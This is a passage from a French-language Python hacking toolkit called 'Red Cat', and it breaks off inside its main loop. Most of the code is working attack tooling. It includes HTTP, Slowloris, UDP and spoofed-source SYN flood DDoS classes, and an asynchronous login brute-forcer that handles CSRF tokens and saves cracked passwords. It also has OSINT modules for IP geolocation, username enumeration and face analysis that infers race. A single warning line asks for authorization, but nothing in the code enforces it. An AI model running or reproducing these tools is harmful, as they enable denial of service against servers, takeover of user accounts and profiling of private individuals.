#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import argparse
import asyncio
import csv
import hashlib
import http.client
import ipaddress
import json
import logging
import os
import random
import re
import signal
import socket
import string
import subprocess
import sys
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from socket import AF_INET, SOCK_STREAM, SOCK_RAW, SOCK_DGRAM, IPPROTO_TCP, IPPROTO_IP, IP_HDRINCL
from struct import pack
from threading import Thread, Lock, Event
from typing import Any, Optional

try:
    import aiohttp
    from aiohttp import ClientSession, ClientTimeout, TCPConnector
    from bs4 import BeautifulSoup
    from termcolor import colored
    from tqdm import tqdm
    from tqdm.asyncio import tqdm as tqdm_async
except ImportError as e:
    print(f"\033[91m[!] Manque : {e}\033[0m")
    print("\033[93m[!] pip install aiohttp beautifulsoup4 tqdm colorama termcolor requests shodan phonenumbers vt-py exifread yt-dlp ipinfo mac-vendor-lookup dnspython\033[0m")
    sys.exit(1)

if sys.platform == "win32":
    try:
        import colorama
        colorama.init()
    except ImportError:
        pass

VERSION = "4.0"
CONFIG_DIR = Path.home() / ".redcat"
CONFIG_FILE = CONFIG_DIR / "config.json"
LOG_FILE = CONFIG_DIR / "redcat.log"
RESULTS_DIR = CONFIG_DIR / "results"
LOG_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


@dataclass
class AppConfig:
    workers: int = 10
    threads_ddos: int = 500
    timeout: float = 10.0
    rate_limit: float = 0.3
    user_agent: str = LOG_UA
    quiet: bool = False
    no_color: bool = False
    export_dir: str = str(RESULTS_DIR)

    @classmethod
    def load(cls):
        if CONFIG_FILE.exists():
            try:
                data = json.loads(CONFIG_FILE.read_text())
                return cls(**{k: v for k, v in data.items() if k in cls.__dataclass_fields__})
            except Exception:
                pass
        return cls()

    def save(self):
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        CONFIG_FILE.write_text(json.dumps(asdict(self), indent=2))


def setup_logging(quiet=False):
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    logger = logging.getLogger("redcat")
    logger.setLevel(logging.DEBUG)
    fh = logging.FileHandler(LOG_FILE, encoding="utf-8")
    fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
    logger.addHandler(fh)
    if not quiet:
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.WARNING)
        ch.setFormatter(logging.Formatter("%(levelname)s: %(message)s"))
        logger.addHandler(ch)
    return logger


LOG = None


class C:
    _enabled = True
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; CYAN = "\033[96m"; WHITE = "\033[97m"
    BLOOD = "\033[38;5;88m"; BLOOD_LIGHT = "\033[38;5;124m"

    @classmethod
    def disable(cls):
        cls._enabled = False
        for attr in dir(cls):
            if attr.isupper() and not attr.startswith("_"):
                setattr(cls, attr, "")


def info(m): print(f"  {C.BLUE}[*]{C.RESET} {m}")
def ok(m): print(f"  {C.GREEN}[+]{C.RESET} {m}")
def warn(m): print(f"  {C.YELLOW}[!]{C.RESET} {m}")
def err(m): print(f"  {C.RED}[x]{C.RESET} {m}")
def dim(m): print(f"  {C.DIM}{m}{C.RESET}")
def blood(m): print(f"  {C.BLOOD}{m}{C.RESET}")


BANNER = f"""{C.RED}
░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░ ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
{C.BLOOD_LIGHT}                       v{VERSION} — Sang pour Sang{C.RESET}
{C.BLOOD}              DDoS · BruteForce · OSINT · Utilitaires{C.RESET}
"""


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def show_banner():
    print(BANNER)
    print()


class Results:
    _data = []
    _lock = Lock()

    @classmethod
    def add(cls, module, target, data):
        entry = {"timestamp": datetime.now().isoformat(), "module": module, "target": target, **data}
        with cls._lock:
            cls._data.append(entry)

    @classmethod
    def export_json(cls, filename=None):
        RESULTS_DIR.mkdir(parents=True, exist_ok=True)
        filename = filename or f"results_{datetime.now():%Y%m%d_%H%M%S}.json"
        path = RESULTS_DIR / filename
        path.write_text(json.dumps(cls._data, indent=2, ensure_ascii=False))
        return path

    @classmethod
    def export_csv(cls, filename=None):
        RESULTS_DIR.mkdir(parents=True, exist_ok=True)
        filename = filename or f"results_{datetime.now():%Y%m%d_%H%M%S}.csv"
        path = RESULTS_DIR / filename
        if not cls._data:
            return path
        keys = set()
        for row in cls._data:
            keys.update(row.keys())
        keys = sorted(keys)
        with path.open("w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=keys)
            w.writeheader()
            w.writerows(cls._data)
        return path

    @classmethod
    def count(cls):
        return len(cls._data)


def prompt(msg, default=None, validator=None):
    while True:
        suffix = f" [{default}]" if default else ""
        try:
            value = input(f"  {C.BLOOD}{msg}{suffix}: {C.RESET}").strip()
        except (EOFError, KeyboardInterrupt):
            raise KeyboardInterrupt
        if not value and default is not None:
            return default
        if not value:
            err("Champ requis")
            continue
        if validator:
            try:
                if not validator(value):
                    err("Valeur invalide")
                    continue
            except Exception as e:
                err(f"Erreur : {e}")
                continue
        return value


def prompt_int(msg, default, min_val=0, max_val=10**9):
    def _v(x):
        v = int(x)
        return min_val <= v <= max_val
    return int(prompt(msg, str(default), _v))


def prompt_choice(msg, choices):
    print(f"  {C.BLOOD}{msg}{C.RESET}")
    for i, c in enumerate(choices, 1):
        print(f"    {C.CYAN}{i}{C.RESET}. {c}")
    while True:
        try:
            v = input(f"  {C.BLOOD}Choix [1-{len(choices)}]: {C.RESET}").strip()
            idx = int(v) - 1
            if 0 <= idx < len(choices):
                return choices[idx]
        except (ValueError, EOFError):
            pass
        except KeyboardInterrupt:
            raise
        err(f"Entre 1 et {len(choices)}")


_dns_cache = {}
_dns_cache_lock = Lock()


def resolve(target):
    if target in _dns_cache:
        return _dns_cache[target]

    host = target
    if "://" in target:
        host = urllib.parse.urlparse(target).hostname or target
    if ":" in host and host.count(":") == 1:
        host = host.split(":")[0]

    try:
        ipaddress.ip_address(host)
        _dns_cache[target] = host
        return host
    except ValueError:
        pass

    try:
        ip = socket.gethostbyname(host)
        with _dns_cache_lock:
            _dns_cache[target] = ip
        return ip
    except socket.gaierror as e:
        if LOG:
            LOG.warning(f"DNS échec {host}: {e}")
        return None


def parse_ports(spec):
    ports = set()
    for part in spec.split(","):
        part = part.strip()
        if "-" in part:
            a, b = part.split("-", 1)
            start, end = int(a), int(b)
            if start > end:
                start, end = end, start
            ports.update(range(start, end + 1))
        elif part:
            ports.add(int(part))
    return sorted(p for p in ports if 1 <= p <= 65535)


def check_root():
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False


class _DDoSBase:
    running = Event()

    def __init__(self, target, port, threads):
        self.target = target
        self.port = port
        self.threads = threads
        self.sent = 0
        self._lock = Lock()
        self._workers = []

    def _inc(self, n=1):
        with self._lock:
            self.sent += n

    def start(self):
        self.running.set()
        for _ in range(self.threads):
            t = Thread(target=self._worker, daemon=True)
            t.start()
            self._workers.append(t)

    def stop(self):
        self.running.clear()

    def _worker(self):
        raise NotImplementedError


class RequestFlood(_DDoSBase):
    def _worker(self):
        while self.running.is_set():
            try:
                conn_cls = http.client.HTTPSConnection if self.port == 443 else http.client.HTTPConnection
                conn = conn_cls(self.target, self.port, timeout=5)
                path = f"/?{random.randbytes(8).hex()}"
                headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive", "Cache-Control": "no-cache"}
                conn.request(random.choice(["GET", "POST"]), path, headers=headers)
                conn.close()
                self._inc()
            except Exception:
                pass


class Pyslow(_DDoSBase):
    def _worker(self):
        while self.running.is_set():
            try:
                s = socket(AF_INET, SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target, self.port))
                payload = (
                    f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Content-Length: 42\r\n"
                ).encode()
                s.send(payload)
                self._inc()
                time.sleep(10)
                s.close()
            except Exception:
                pass


class UDPFlood(_DDoSBase):
    PAYLOADS = [b"GET / HTTP/1.1\r\n", b"PING\r\n", b"HELLO\r\n"]

    def _worker(self):
        while self.running.is_set():
            try:
                s = socket(AF_INET, SOCK_DGRAM)
                data = random.choice(self.PAYLOADS) + os.urandom(random.randint(16, 128))
                s.sendto(data, (self.target, self.port))
                s.close()
                self._inc()
            except Exception:
                pass


class SynFlood(_DDoSBase):
    def _worker(self):
        while self.running.is_set():
            try:
                src = self._fake_ip()
                s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                iph = pack("!BBHHHBBH4s4s",
                           (4 << 4) + 5, 0, 40, random.randint(1, 65535),
                           0, 64, IPPROTO_TCP, 0,
                           socket.inet_aton(src), socket.inet_aton(self.target))
                sport = random.randint(1024, 65535)
                tcph = pack("!HHLLBBHHH",
                            sport, self.port,
                            random.randint(0, 2**32 - 1), 0,
                            (5 << 4), 2,
                            5840, 0, 0)
                pseudo = pack("!4s4sBBH",
                              socket.inet_aton(src),
                              socket.inet_aton(self.target),
                              0, IPPROTO_TCP, len(tcph)) + tcph
                csum = self._checksum(pseudo)
                tcph = pack("!HHLLBBHHH",
                            sport, self.port,
                            random.randint(0, 2**32 - 1), 0,
                            (5 << 4), 2, 5840, csum, 0)
                s.sendto(iph + tcph, (self.target, 0))
                s.close()
                self._inc()
            except PermissionError:
                err("Root requis pour SynFlood")
                self.stop()
                return
            except Exception:
                pass

    @staticmethod
    def _fake_ip():
        while True:
            parts = [random.randint(1, 254) for _ in range(4)]
            if parts[0] not in (10, 127, 172, 192):
                return ".".join(map(str, parts))

    @staticmethod
    def _checksum(data):
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) + data[i + 1]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF


def menu_ddos():
    print(f"\n  {C.BLOOD}═══ DDOS — Test de charge ═══{C.RESET}")
    warn("À n'utiliser que sur VOS serveurs ou avec autorisation écrite.")

    mode = prompt_choice("Type d'attaque", [
        "HTTP Flood (Request)",
        "Slowloris (Pyslow)",
        "UDP Flood",
        "SYN Flood (root requis)",
    ])

    target = prompt("Cible (host/URL)")
    ip = resolve(target)
    if not ip:
        err(f"Résolution échouée : {target}")
        return
    ok(f"Cible : {target} → {ip}")

    if mode.startswith("HTTP"):
        port = prompt_int("Port", 80)
        threads = prompt_int("Threads", 500, 1, 10000)
        attack = RequestFlood(ip, port, threads)
    elif mode.startswith("Slowloris"):
        port = prompt_int("Port", 80)
        threads = prompt_int("Threads", 200, 1, 5000)
        attack = Pyslow(ip, port, threads)
    elif mode.startswith("UDP"):
        port = prompt_int("Port", 80)
        threads = prompt_int("Threads", 500, 1, 5000)
        attack = UDPFlood(ip, port, threads)
    else:
        if not check_root():
            err("SYN Flood nécessite root (su)")
            return
        port = prompt_int("Port", 80)
        threads = prompt_int("Threads", 200, 1, 2000)
        attack = SynFlood(ip, port, threads)

    info("Démarrage... (Ctrl+C pour arrêter)")
    attack.start()

    try:
        last = 0
        while True:
            time.sleep(1)
            if attack.sent != last:
                blood(f"  Paquets envoyés : {attack.sent}")
                last = attack.sent
    except KeyboardInterrupt:
        attack.stop()
        time.sleep(0.5)
        ok(f"Arrêté — Total : {attack.sent} paquets")


CSRF_PATTERNS = re.compile(
    r"csrf[-_]?token|_csrf|csrfmiddlewaretoken|_token|"
    r"authenticity_token|__RequestVerificationToken|XSRF[-_]TOKEN",
    re.IGNORECASE,
)
PASSWORD_INPUT_RE = re.compile(r'<input[^>]+type=["\']password["\']', re.IGNORECASE)
TWO_FA_RE = re.compile(r"\b(otp|2fa|two[\- ]?factor|mfa|totp|verification[\- ]?code)\b", re.IGNORECASE)
LOCKOUT_RE = re.compile(r"\b(too many (failed|attempts)|account (locked|suspended)|rate[\- ]?limit)\b", re.IGNORECASE)


@dataclass
class BruteConfig:
    url: str
    username: str
    password_file: str
    error_message: str
    username_field: str = "email"
    password_field: str = "password"
    mode: str = "form"
    api_endpoint: Optional[str] = None
    workers: int = 10
    timeout: float = 15.0
    max_retries: int = 3
    proxy: Optional[str] = None
    output: Optional[str] = None


class BruteCracker:
    def __init__(self, cfg):
        self.cfg = cfg
        self.session = None
        self.baseline_body = None
        self.csrf_name = None
        self.csrf_value = None
        self._lockout_count = 0

    async def __aenter__(self):
        connector = TCPConnector(limit=self.cfg.workers * 2, limit_per_host=self.cfg.workers, ttl_dns_cache=300)
        timeout = ClientTimeout(total=self.cfg.timeout)
        headers = {"User-Agent": LOG_UA, "Accept": "text/html,*/*;q=0.8"}
        self.session = ClientSession(connector=connector, timeout=timeout, headers=headers)
        return self

    async def __aexit__(self, *_):
        if self.session:
            await self.session.close()

    async def _fetch_csrf(self):
        try:
            async with self.session.get(self.cfg.url) as r:
                html = await r.text()
        except Exception as e:
            if LOG:
                LOG.debug(f"CSRF fetch: {e}")
            return

        soup = BeautifulSoup(html, "html.parser")
        for tag in soup.find_all(["input", "meta"]):
            name = tag.get("name") or ""
            if CSRF_PATTERNS.search(name):
                val = tag.get("value") or tag.get("content") or ""
                if val:
                    self.csrf_name, self.csrf_value = name, val
                    return
        for cookie in self.session.cookie_jar:
            if CSRF_PATTERNS.search(cookie.key):
                self.csrf_name, self.csrf_value = cookie.key, cookie.value
                return

    async def _attempt(self, password):
        headers = {
            "Referer": self.cfg.url,
            "Origin": f"{urllib.parse.urlparse(self.cfg.url).scheme}://{urllib.parse.urlparse(self.cfg.url).netloc}",
        }
        if self.cfg.mode == "json":
            headers["Content-Type"] = "application/json"
            if self.csrf_value:
                headers["X-CSRFToken"] = self.csrf_value
            payload = {self.cfg.username_field: self.cfg.username, self.cfg.password_field: password}
            endpoint = self.cfg.api_endpoint or self.cfg.url
            kw = {"json": payload}
        else:
            payload = {self.cfg.username_field: self.cfg.username, self.cfg.password_field: password}
            if self.csrf_name and self.csrf_value:
                payload[self.csrf_name] = self.csrf_value
            endpoint = self.cfg.url
            kw = {"data": payload}

        if self.cfg.proxy:
            kw["proxy"] = self.cfg.proxy

        try:
            async with self.session.post(endpoint, headers=headers, allow_redirects=True, **kw) as r:
                body = await r.text()
                status = r.status
                if status == 429:
                    retry_after = float(r.headers.get("Retry-After", "5") or 5)
                    await asyncio.sleep(retry_after)
                    return False, "rate_limited"
                if LOCKOUT_RE.search(body.lower()):
                    self._lockout_count += 1
                    return False, "locked"
                if self.baseline_body and body == self.baseline_body:
                    return False, "same"
                if self.cfg.error_message and self.cfg.error_message.lower() in body.lower():
                    return False, "wrong"
                if TWO_FA_RE.search(body.lower()):
                    return True, "2fa"
                return True, "success"
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            if LOG:
                LOG.debug(f"Attempt: {e}")
            return False, "error"

    async def run(self, passwords):
        info("Calibration...")
        await self._fetch_csrf()
        try:
            async with self.session.post(
                self.cfg.api_endpoint or self.cfg.url,
                data={self.cfg.username_field: self.cfg.username, self.cfg.password_field: "x" * 24},
                headers={"Referer": self.cfg.url},
            ) as r:
                self.baseline_body = await r.text()
        except Exception as e:
            err(f"Calibration : {e}")
            return None

        found = None
        checked = 0
        total = len(passwords)
        sem = asyncio.Semaphore(self.cfg.workers)
        stop_event = asyncio.Event()
        pbar = tqdm_async(total=total, desc="BruteForce", disable=not sys.stdout.isatty())

        async def worker(pwd):
            nonlocal found, checked
            if stop_event.is_set():
                return
            async with sem:
                if stop_event.is_set():
                    return
                success, reason = await self._attempt(pwd)
                checked += 1
                pbar.update(1)
                if success:
                    found = pwd
                    stop_event.set()
                    pbar.set_description(f"TROUVÉ: {pwd}")
                elif reason == "locked" and self._lockout_count >= 3:
                    warn("Lockout détecté, arrêt")
                    stop_event.set()

        await asyncio.gather(*[worker(p) for p in passwords])
        pbar.close()
        return found


def menu_bruteforce():
    print(f"\n  {C.BLOOD}═══ BRUTEFORCE ═══{C.RESET}")

    mode = prompt_choice("Mode", ["Formulaire HTML", "API JSON"])
    url = prompt("URL cible")
    username = prompt("Username / Email")
    password_file = prompt("Fichier de mots de passe")

    if not Path(password_file).exists():
        err(f"Fichier introuvable : {password_file}")
        return

    passwords = [l.strip() for l in Path(password_file).read_text(errors="ignore").splitlines() if l.strip()]
    if not passwords:
        err("Fichier vide")
        return

    error_msg = prompt("Message d'erreur", "Invalid")
    workers = prompt_int("Workers", 10, 1, 100)

    cfg = BruteConfig(
        url=url, username=username, password_file=password_file,
        error_message=error_msg, workers=workers,
        mode="json" if "JSON" in mode else "form",
        api_endpoint="/login" if "JSON" in mode else None,
    )

    ok(f"Chargé {len(passwords)} mots de passe")

    async def _run():
        async with BruteCracker(cfg) as cracker:
            return await cracker.run(passwords)

    try:
        found = asyncio.run(_run())
    except KeyboardInterrupt:
        warn("Interrompu")
        return

    if found:
        ok(f"\n🔥 PASSWORD TROUVÉ : {found}")
        Results.add("bruteforce", url, {"username": username, "password": found})
        if cfg.output:
            Path(cfg.output).write_text(f"{username}:{found}\n")
            ok(f"Sauvegardé dans {cfg.output}")
    else:
        warn("Aucun mot de passe trouvé")


async def _http_get_json(url, timeout=10.0):
    try:
        async with aiohttp.ClientSession(timeout=ClientTimeout(total=timeout)) as s:
            async with s.get(url, headers={"User-Agent": LOG_UA}) as r:
                return await r.json()
    except Exception as e:
        if LOG:
            LOG.debug(f"HTTP {url}: {e}")
        return None


async def osint_geoloc(target):
    ip = resolve(target) or target
    data = await _http_get_json(
        f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
    )
    if not data or data.get("status") != "success":
        err("IP non trouvée")
        return
    print()
    for k, v in data.items():
        if k != "status":
            print(f"  {C.GREEN}[+]{C.RESET} {k:12}: {v}")
    print(f"\n  {C.YELLOW}https://maps.google.com/?q={data.get('lat')},{data.get('lon')}{C.RESET}")
    Results.add("geoloc", ip, data)


SHERLOCK_SITES = {
    "GitHub": "https://github.com/{}",
    "Twitter": "https://twitter.com/{}",
    "Instagram": "https://www.instagram.com/{}/",
    "Reddit": "https://www.reddit.com/user/{}",
    "TikTok": "https://www.tiktok.com/@{}",
    "YouTube": "https://youtube.com/@{}",
    "Medium": "https://medium.com/@{}",
    "Dev.to": "https://dev.to/{}",
    "Pinterest": "https://www.pinterest.com/{}",
    "Telegram": "https://t.me/{}",
    "Twitch": "https://www.twitch.tv/{}",
    "Steam": "https://steamcommunity.com/id/{}",
}


async def osint_sherlock():
    username = prompt("Username à rechercher")

    async def check(session, site, url, sem):
        async with sem:
            full = url.format(username)
            try:
                async with session.get(full, allow_redirects=True, timeout=ClientTimeout(total=8)) as r:
                    return site, full, r.status == 200
            except Exception:
                return site, full, False

    sem = asyncio.Semaphore(5)
    async with aiohttp.ClientSession(headers={"User-Agent": LOG_UA}) as s:
        tasks = [check(s, name, url, sem) for name, url in SHERLOCK_SITES.items()]
        results = await tqdm_async.gather(*tasks, desc="Sherlock")

    found = [(name, url) for name, url, ok_ in results if ok_]
    print()
    if found:
        ok(f"{len(found)} compte(s) trouvé(s) :")
        for name, url in found:
            print(f"  {C.GREEN}✅{C.RESET} {name:12} → {url}")
        Results.add("sherlock", username, {"found": found})
    else:
        warn("Aucun compte trouvé")


def osint_searchface():
    print(f"\n  {C.BLOOD}SearchFace — analyse d'image{C.RESET}")
    path = prompt("Chemin de l'image").strip('"\'')

    if not Path(path).exists():
        err(f"Fichier introuvable : {path}")
        return

    try:
        import cv2
        from deepface import DeepFace
    except ImportError:
        warn("pip install deepface opencv-python")
        return

    try:
        img = cv2.imread(path)
        if img is None:
            err("Image illisible")
            return
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        cascade = cv2.CascadeClassifier(cv2.data.haarcascades + "haarcascade_frontalface_default.xml")
        faces = cascade.detectMultiScale(gray, 1.1, 4)
        if len(faces) == 0:
            warn("Aucun visage détecté")
            return
        ok(f"{len(faces)} visage(s) détecté(s)")
        r = DeepFace.analyze(img_path=path,
                             actions=["emotion", "age", "gender", "race"],
                             enforce_detection=False, silent=True)
        if isinstance(r, list):
            r = r[0]
        data = {
            "age": r.get("age"),
            "gender": r.get("gender"),
            "race": r.get("dominant_race"),
            "emotion": max(r["emotion"], key=r["emotion"].get) if "emotion" in r else None,
        }
        print()
        for k, v in data.items():
            print(f"  {C.GREEN}[+]{C.RESET} {k:10}: {v}")
        Results.add("searchface", path, data)
        print(f"\n  {C.YELLOW}Recherche inversée :{C.RESET}")
        print(f"  {C.DIM}  https://pimeyes.com/fr/upload{C.RESET}")
        print(f"  {C.DIM}  https://tineye.com{C.RESET}")
    except Exception as e:
        err(f"Erreur : {e}")


async def util_port_scan():
    target = prompt("Cible (IP/domaine)")
    ports_spec = prompt("Ports (ex: 80,443,8000-8100)", "1-1024")

    ip = resolve(target)
    if not ip:
        err("Résolution échouée")
        return

    try:
        ports = parse_ports(ports_spec)
    except ValueError as e:
        err(f"Ports invalides : {e}")
        return

    ok(f"Scan de {target} ({ip}) — {len(ports)} ports")

    async def scan_one(port, sem):
        async with sem:
            try:
                fut = asyncio.open_connection(ip, port)
                _, w = await asyncio.wait_for(fut, timeout=1.5)
                w.close()
                await w.wait_closed()
                return port
            except Exception:
                return None

    sem = asyncio.Semaphore(200)
    tasks = [scan_one(p, sem) for p in ports]
    open_ports = []
    for coro in tqdm_async.as_completed(tasks, total=len(tasks), desc="Scan"):
        r = await coro
        if r:
            open_ports.append(r)

    if open_ports:
        ok(f"{len(open_ports)} port(s) ouvert(s) : {sorted(open_ports)}")
        Results.add("port_scan", ip, {"open": sorted(open_ports)})
    else:
        warn("Aucun port ouvert")


SUBDOMAINS = [
    "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", "cpanel",
    "autodiscover", "m", "imap", "test", "ns", "blog", "pop3", "dev", "www2",
    "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old",
    "lists", "support", "mobile", "mx", "static", "docs", "beta", "shop",
    "sql", "secure", "demo", "cp", "calendar", "wiki", "web", "media",
    "email", "images", "img", "download", "dns", "api", "staging", "preprod",
]


def util_subdomain_finder():
    domain = prompt("Domaine (ex: example.com)")
    found = []
    print()
    for sub in tqdm(SUBDOMAINS, desc="Sous-domaines"):
        full = f"{sub}.{domain}"
        try:
            socket.gethostbyname(full)
            found.append(full)
            tqdm.write(f"  {C.GREEN}[+]{C.RESET} {full}")
        except socket.gaierror:
            pass
    if found:
        ok(f"{len(found)} sous-domaine(s)")
        Results.add("subdomain", domain, {"found": found})
    else:
        warn("Aucun trouvé")


def util_whois():
    domain = prompt("Domaine")
    try:
        r = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=20)
        if r.returncode != 0:
            err("whois a échoué")
            return
        lines = [l for l in r.stdout.splitlines() if l.strip() and ":" in l][:40]
        print()
        for line in lines:
            print(f"  {C.GREEN}[+]{C.RESET} {line}")
        Results.add("whois", domain, {"raw": "\n".join(lines)})
    except FileNotFoundError:
        err("Commande whois absente (pkg install whois)")
    except Exception as e:
        err(f"Erreur : {e}")


def util_dns_lookup():
    target = prompt("Domaine ou IP")
    try:
        import dns.resolver
    except ImportError:
        err("pip install dnspython")
        return

    results = {}
    for rt in ["A", "MX", "NS", "TXT", "CNAME"]:
        try:
            answers = dns.resolver.resolve(target, rt, lifetime=5)
            values = [str(r) for r in answers]
            results[rt] = values
            print(f"  {C.GREEN}[+]{C.RESET} {rt:6}: {', '.join(values)}")
        except Exception:
            pass
    if results:
        Results.add("dns", target, results)


def util_password_gen():
    length = prompt_int("Longueur", 20, 8, 128)
    count = prompt_int("Nombre", 5, 1, 100)
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*()_-+=<>?"
    print()
    passwords = []
    for i in range(count):
        pwd = "".join(random.choice(alphabet) for _ in range(length))
        passwords.append(pwd)
        print(f"  {C.GREEN}[{i+1:2}]{C.RESET} {pwd}")
    Results.add("password_gen", f"len={length}", {"passwords": passwords})


def util_hash_gen():
    text = prompt("Texte à hasher")
    hashes = {
        "MD5": hashlib.md5(text.encode()).hexdigest(),
        "SHA1": hashlib.sha1(text.encode()).hexdigest(),
        "SHA256": hashlib.sha256(text.encode()).hexdigest(),
        "SHA512": hashlib.sha512(text.encode()).hexdigest(),
    }
    print()
    for k, v in hashes.items():
        print(f"  {C.GREEN}[+]{C.RESET} {k:8}: {v}")
    Results.add("hash", text, hashes)


def util_ytdl():
    try:
        import yt_dlp
    except ImportError:
        err("pip install yt-dlp")
        return

    url = prompt("URL YouTube")
    outdir = prompt("Dossier de sortie", str(Path.home() / "Downloads"))
    try:
        ydl_opts = {
            "format": "bestaudio/best",
            "outtmpl": str(Path(outdir) / "%(title)s.%(ext)s"),
            "quiet": True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info_ = ydl.extract_info(url, download=False)
            ok(f"Titre : {info_.get('title')}")
            ok(f"Durée : {info_.get('duration')}s")
            confirm = prompt("Télécharger ? (o/n)", "n").lower()
            if confirm == "o":
                ydl_opts["download"] = True
                with yt_dlp.YoutubeDL(ydl_opts) as ydl2:
                    ydl2.download([url])
                ok("Téléchargement terminé")
                Results.add("youtube", url, {"title": info_.get("title")})
    except Exception as e:
        err(f"Erreur : {e}")


def util_mc_ip():
    serveur = prompt("Serveur Minecraft")
    ip = resolve(serveur)
    if not ip:
        err("Résolution échouée")
        return

    ok(f"IP : {ip}")

    try:
        s = socket.socket()
        s.settimeout(3)
        if s.connect_ex((ip, 25565)) == 0:
            ok("Port 25565 OUVERT")
        else:
            warn("Port 25565 FERMÉ")
        s.close()
    except Exception:
        pass

    try:
        import dns.resolver
        for srv in dns.resolver.resolve(f"_minecraft._tcp.{serveur}", "SRV", lifetime=5):
            print(f"  {C.GREEN}[+]{C.RESET} SRV: {srv.target} : {srv.port}")
    except Exception:
        pass

    Results.add("mc_ip", serveur, {"ip": ip})


async def util_ip_tracker():
    target = prompt("IP à tracer")
    data = await _http_get_json(
        f"http://ip-api.com/json/{target}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
    )
    if not data or data.get("status") != "success":
        err("Échec")
        return
    print()
    for k, v in data.items():
        if k != "status":
            print(f"  {C.GREEN}[+]{C.RESET} {k:12}: {v}")
    print(f"\n  {C.YELLOW}https://maps.google.com/?q={data.get('lat')},{data.get('lon')}{C.RESET}")
    Results.add("ip_tracker", target, data)


MENU = {
    "1":  ("🔥", "DDoS — Test de charge", menu_ddos),
    "2":  ("🔓", "BruteForce — Formulaire/API", menu_bruteforce),
    "3":  ("🌍", "OSINT — Géolocalisation IP", lambda: asyncio.run(osint_geoloc(prompt("IP/domaine")))),
    "4":  ("🕵️", "OSINT — Sherlock (comptes)", lambda: asyncio.run(osint_sherlock())),
    "5":  ("👤", "OSINT — SearchFace (image)", osint_searchface),
    "6":  ("🔌", "Util — Port Scanner", lambda: asyncio.run(util_port_scan())),
    "7":  ("🌐", "Util — Subdomain Finder", util_subdomain_finder),
    "8":  ("📋", "Util — Whois Lookup", util_whois),
    "9":  ("📡", "Util — DNS Lookup", util_dns_lookup),
    "10": ("🔑", "Util — Générateur mot de passe", util_password_gen),
    "11": ("#️⃣", "Util — Hash Generator", util_hash_gen),
    "12": ("🎵", "Util — YouTube Downloader", util_ytdl),
    "13": ("⛏️", "Util — MC IP Finder", util_mc_ip),
    "14": ("📍", "Util — IP Tracker", lambda: asyncio.run(util_ip_tracker())),
    "15": ("💾", "Exporter les résultats (JSON)", None),
    "16": ("📊", "Statistiques de session", None),
    "99": ("🚪", "Quitter", None),
}


def show_menu():
    print(f"{C.BLOOD}╔══════════════════════════════════════════════════════════════╗")
    print(f"║              {C.BLOOD_LIGHT}RED CAT v{VERSION} — Menu Principal{C.BLOOD}                  ║")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    for key, (icon, label, _) in MENU.items():
        if key == "99":
            print(f"║                                                              ║")
        print(f"║  {C.RED}[{C.WHITE}{key:>2}{C.RED}]{C.WHITE} {icon}  {label:<46}{C.BLOOD}║")
    print(f"╚══════════════════════════════════════════════════════════════╝{C.RESET}")


def run_interactive():
    clear_screen()
    show_banner()

    while True:
        try:
            print()
            show_menu()
